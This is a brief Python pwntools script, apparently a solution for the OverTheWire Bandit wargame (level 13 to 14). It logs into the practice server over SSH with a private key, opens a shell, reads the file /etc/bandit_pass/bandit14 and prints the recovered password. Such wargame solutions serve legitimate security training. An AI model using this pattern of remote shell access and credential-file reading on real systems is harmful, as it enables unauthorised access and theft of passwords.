#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit13 exploit by SKane')

shell = ssh('bandit14', 'bandit.labs.overthewire.org', keyfile='../sshkey/sshkey1.private', port=2220)

sh = shell.run('sh')

sh.sendline('cat /etc/bandit_pass/bandit14')

log.success("Password for bandit14: " + sh.recvline())
